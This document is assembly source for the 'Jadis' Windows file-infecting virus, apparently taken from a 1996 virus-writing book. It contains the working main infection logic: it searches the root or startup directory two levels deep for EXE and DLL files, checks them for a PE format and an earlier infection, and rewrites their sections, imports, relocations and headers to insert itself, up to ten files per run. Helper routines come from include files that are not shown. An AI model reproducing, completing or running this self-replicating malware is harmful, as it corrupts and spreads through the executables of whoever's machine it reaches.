;The Jadis Virus - Named after the Queen of Charn.
;
;(C) 1996 American Eagle Publications, Inc. All Rights Reserved.
;
.386
locals
jumps
.model flat,STDCALL

;*****************************************************************************
;*****************************************************************************
;The host for the virus loader starts here. This program assembles to look
;exactly what an infection would look like if it were dynamically performed.

INCLUDE HOST2.INC

;*****************************************************************************
;*****************************************************************************
;The Jadis Virus starts here.

;Definitions for the virus
MAX_PATH        EQU     255H            ;maximum path length in Win 95/NT
FIND_SIZE       EQU     11*4+14+MAX_PATH;size of file find data structure
OPEN_EXISTING   EQU     3               ;flag for CreateFile to open existing file
GENERIC_READ    EQU     80000000H       ;flags for CreateFile
GENERIC_WRITE   EQU     40000000H
FATTR_NORMAL    EQU     0               ;normal file attribute for CreateFile

PE_SIZE         EQU     248             ;size of PE file header
SEC_SIZE        EQU     40              ;size of a section header
IID_SIZE        EQU     20              ;size of an Import Image Descriptor record
FB_SIZE         EQU     1024            ;size of workspace for file reading
DIR_SIZE        EQU     64              ;size of a directory path

;Stack frame definitions:
SRCH_HANDLE     EQU     0               ;handle for file search functions
SRCH_HANDLE2    EQU     SRCH_HANDLE+4   ;and a second one
TEMP            EQU     SRCH_HANDLE2+4  ;temporary storage location
FHANDLE         EQU     TEMP+4          ;handle for file open/read/write/close
OLD_RAW         EQU     FHANDLE+4       ;old raw data size of section being infected
OLD_IDATA       EQU     OLD_RAW+4       ;old raw data size of idata section
END_IDATA       EQU     OLD_IDATA+4     ;rva of end of idata of host, before infect
LO_IDATA        EQU     END_IDATA+4     ;range of idata which needs special
HI_IDATA        EQU     LO_IDATA+4      ;relocation adjustment
IOBYTES         EQU     HI_IDATA+4
CSECTION        EQU     IOBYTES+4       ;section number of code section being infected
INFECTS         EQU     CSECTION+1      ;infection counter
IBR             EQU     INFECTS+1       ;this needs 8 bytes
IID             EQU     INFECTS+1       ;same place as IBR, this needs 20 bytes
DIR_DEPTH       EQU     IID+20          ;Depth of directory search
HOME_DIR        EQU     DIR_DEPTH+1     ;Buffer to save startup directory in
FIND_DATA       EQU     HOME_DIR+DIR_SIZE ;file search data structure
;typedef struct _WIN32_FIND_DATA {
;   DWORD dwFileAttributes;
;   FILETIME ftCreationTime;            ;DD ?,?
;   FILETIME ftLastAccessTime;          ;DD ?,?
;   FILETIME ftLastWriteTime;           ;DD ?,?
;   DWORD nFileSizeHigh;
;   DWORD nFileSizeLow;
;   DWORD dwReserved0;
;   DWORD dwReserved1;
;   CHAR cFileName[MAX_PATH];
;   CHAR cAlternateFileName[ 14 ];
;} WIN32_FIND_DATA
FIND_DATA2      EQU     FIND_DATA+FIND_SIZE
HDRBUF          EQU     FIND_DATA2+FIND_SIZE
FILEBUF         EQU     HDRBUF+FB_SIZE          ;Need 4K here + 3
RELBUF          EQU     FILEBUF+4*FB_SIZE+3     ;Max size needed is 2K
TIME            EQU     RELBUF+2*FB_SIZE
WORKSP          EQU     TIME+16

;The virus code itself starts right here. Control is passed here when the
;program starts up. This is the main control routine, which performs the
;infection and then passes control to the host. The first step is to
;set up the stack variables and the relocation register edi, and initialize
;a couple variables used in the main control routine.

VIRUS:  pushad
        call    RELOC
RELOC:  pop     edi                             ;edi contains relocation address for virus
        sub     edi,OFFSET RELOC
        sub     esp,WORKSP                      ;set up temporary data area on stack
        mov     ebp,esp
        mov     BYTE PTR [ebp+DIR_DEPTH],0      ;initialize dir depth flag
        mov     BYTE PTR [ebp+INFECTS],0        ;zero infection counter

        call    GET_LOCAL_TIME                  ;50-50 chance of going to root
        mov     eax,[ebp+TIME+12]
        and     eax,1
        jnz     HOME_INFECT

;        call    MESSAGE_BEEP    ;BEEP INSTEAD OF GOING TO ROOT
;        jmp     HOME_INFECT     ;FOR TEST PURPOSES ONLY

;Now the virus attempts to change to the root directory if it can properly save
;the full name of the startup directory.
        lea     eax,[ebp+HOME_DIR]              ;buffer to put startup directory in
        mov     ecx,DIR_SIZE                    ;size of directory buffer
        call    GET_DIRECTORY
        jz      HOME_INFECT                     ;can't save dir, just infect in home dir
        lea     eax,[edi+OFFSET ROOT_DIR]
        call    SET_DIRECTORY                   ;change to root directory
        jmp     TWO_LEVEL_INFECT

;If we come here, the virus will start out in the home directory and infect
;from there, rather than from the root directory.
HOME_INFECT:
        mov     eax,'.'                         ;set current directory as home
        mov     [ebp+HOME_DIR],eax

;Here a two directory level infect is implemented.
TWO_LEVEL_INFECT:
        call    FIND_FIRST_FILE                 ;find a file
        jz      EXIT                            ;no more files to infect, exit to host
INFLP:  cmp     BYTE PTR [ebp+DIR_DEPTH],0      ;are we in the root dir?
        jnz     INFECT                          ;nope, don't go down another level
        call    IS_DIRECTORY                    ;is "file" found a valid directory?
        jz      INFECT                          ;nope, go try to infect file
        call    SWITCH_DIR_DOWN                 ;else go down a directory level
        jmp     TWO_LEVEL_INFECT                ;and go search that directory
INFECT: call    INFECT_FILE                     ;infect the file we've found
        cmp     BYTE PTR [ebp+INFECTS],10       ;don't infect more than 10 files
        je      EXIT
NEXT:   call    FIND_NEXT_FILE                  ;find another file
        jnz     INFLP
        call    SEARCH_CLOSE                    ;done, close search handle
        cmp     BYTE PTR [ebp+DIR_DEPTH],0      ;are we in root?
        je      EXIT                            ;yes, really done
        call    SWITCH_DIR_UP                   ;else go up a directory level
        jmp     NEXT                            ;and go find next file at that level

EXIT:   lea     eax,[ebp+HOME_DIR]      ;restore original directory
        call    SET_DIRECTORY
        add     esp,WORKSP
        popad                           ;get rid of temporary data area
HADDR:  jmp     HOST                    ;this address is dynamically modified by the virus

ROOT_DIR        DB      '\',0
UP_DIR          DB      '..',0

;This routine switches down a directory, both performing the change directory
;and moving the file find data structures so they don't get overwritten.
SWITCH_DIR_DOWN:
        inc     BYTE PTR [ebp+DIR_DEPTH]        ;increment depth
        mov     eax,[ebp+SRCH_HANDLE]           ;save necessary data
        mov     [ebp+SRCH_HANDLE2],eax
        push    esi
        push    edi
        lea     esi,[ebp+FIND_DATA]
        lea     edi,[ebp+FIND_DATA2]
        mov     ecx,FIND_SIZE
        rep     movsb
        pop     edi
        pop     esi
        lea     eax,[ebp+FIND_DATA+11*4]        ;point to file name
        call    SET_DIRECTORY                   ;and change directory
        ret

;This routine goes back up a directory.
SWITCH_DIR_UP:
        dec     BYTE PTR [ebp+DIR_DEPTH]        ;decrement depth
        mov     eax,[ebp+SRCH_HANDLE2]          ;restore necessary data
        mov     [ebp+SRCH_HANDLE],eax
        push    esi
        push    edi
        lea     esi,[ebp+FIND_DATA2]
        lea     edi,[ebp+FIND_DATA]
        mov     ecx,FIND_SIZE
        rep     movsb
        pop     edi
        pop     esi
        lea     eax,[edi+UP_DIR]                ;point to ".."
        call    SET_DIRECTORY                   ;and change directory
        ret

;This routine checks to see if the file found and reported on in FIND_DATA is
;a directory or not, and that is not one of the system entries "." or ".."
;If it is a valid directory, it returns with NZ.
IS_DIRECTORY:
        test    BYTE PTR [ebp+FIND_DATA],10H      ;check for directory attribute
        jz      IDZX                              ;nope, not a dir
        cmp     BYTE PTR [ebp+FIND_DATA+11*4],'.' ;check for system dir
IDZX:   ret

;******************************************************************************
;This routine checks to see if the PE file in question can be infected. It
;just checks to see if there is room in its memory to hold the PE header and
;the section headers, and if the Jadis code is already at the entry point.
CAN_INFECT:
        mov     eax,esi
        sub     eax,HDRBUF
        add     eax,PE_SIZE             ;eax = size of DOS header + PE header
        mov     ebx,eax                 ;save it here

        xor     eax,eax
        mov     ax,[ebp+esi+6]          ;get actual section count
        mov     ecx,SEC_SIZE            ;determine the size of section headers
        mul     ecx
        add     eax,ebx                 ;eax=size of all header info needed

        cmp     eax,FB_SIZE             ;will it fit in HDRBUF?
        jnc     CINO                    ;nope, exit with NZ set - don't infect

        xor     ecx,ecx
        call    GET_SEC_PTR             ;pointer to first section header in ebx
        test    [ebp+ebx+9*4],20000000H ;executable?
        jz      CINO                    ;nope, don't infect

                                ;now check to see if already infected
        mov     eax,[ebp+esi+40]        ;get entry point
        call    RVA_TO_FILEPTR          ;find entry point in file
        call    FILE_SEEK
        mov     ecx,12
        lea     edx,[ebp+FILEBUF]       ;read 12 bytes from entry point
        call    FILE_READ
        mov     eax,[ebp+FILEBUF]
        cmp     eax,[edi+OFFSET VIRUS]  ;compare 4 bytes
        jne     CIYES
        mov     eax,[ebp+FILEBUF+4]
        cmp     eax,[edi+OFFSET VIRUS+4];and 4 more
        jne     CIYES
        mov     eax,[ebp+FILEBUF+8]
        cmp     eax,[edi+OFFSET VIRUS+8];and 4 more
        je      CINO

CIYES:  xor     al,al                   ;clear to infect, set z and return
        ret
CINO:   mov     al,1
        or      eax,eax                 ;don't infect, return with NZ
        ret

;This routine simply examines the data structure FIND_DATA to see if the file
;found by FIND_FIRST/FIND_NEXT_FILE ends with an "EXE" or a "DLL". If so,
;it returns with z set.
CHECK_KIND:
        lea     esi,[ebp+FIND_DATA+44]
CKL:    lodsb
        or      al,al
        jnz     CKL                     ;get to end of name string
        mov     eax,[esi-4]             ;get last 3 bytes of name
        or      eax,202020H
        cmp     eax,'exe'
        jz      CKX                     ;jump if EXE
        cmp     eax,'lld'               ;else try DLL
CKX:    ret

;This routine infects the file found by FIND_FIRST_FILE and FIND_NEXT_FILE, if
;it can. First it must check to see if the file is infectable. To be infectable,
;the file must be a 32-bit Portable Executable, and the virus must not already
;be present.
INFECT_FILE:
        call    CHECK_KIND              ;see if this is an EXE or DLL
        jnz     IFEX1                   ;nope, just exit
        call    FILE_OPEN               ;open the EXE file specified in FIND_DATA
        jz      IFEX1                   ;successful? no, just exit
        mov     [ebp+FHANDLE],eax       ;save handle here
        call    IS_PE_FILE              ;check to see if this is a PE file (also sets ebp+esi->PE header)
        jnz     IFEX                    ;no, close file and exit
        call    CAN_INFECT              ;check to see if it can be infected
        jz      _IF1                    ;yes, go do it

IFEX:   call    FILE_CLOSE              ;close the file
IFEX1:  ret                             ;and return to caller

;If we get here, we have a valid 32-bit file with a PE header, and the
;virus is not present. The infection process may begin. The infection process
;is broken out into various procedures.
_IF1:
        call    FIND_LAST_EXEC          ;find the last executable code section
        mov     [ebp+CSECTION],al       ;store section number here
        inc     BYTE PTR [ebp+INFECTS]  ;increment infection counter
        call    MOVE_SECTIONS           ;move all sections after the one being infected
        call    INSERT_VIRUS_CODE       ;insert the virus in the code section
        call    UPDATE_IMG_DAT_DIR      ;update image data directory in memory
        call    UPDATE_IMPORTS          ;and the imports
        call    BUILD_IMPORT_DATA       ;modify import data area to accomodate virus imports
        call    UPDATE_RESOURCES        ;update the resources
        call    UPDATE_RELOCATIONS      ;update the relocations
        call    UPDATE_EXPORTS          ;update the exports
_IF2:   call    UPDATE_PE_HEADER        ;write new PE header to disk
        jmp     IFEX                    ;and exit infect routine

INCLUDE INFECT.INC
INCLUDE MOVE.INC
INCLUDE BASICS.INC
INCLUDE IMPORT.INC

VIR_SIZE        EQU     $ - OFFSET VIRUS

        ends

        end     VIRUS
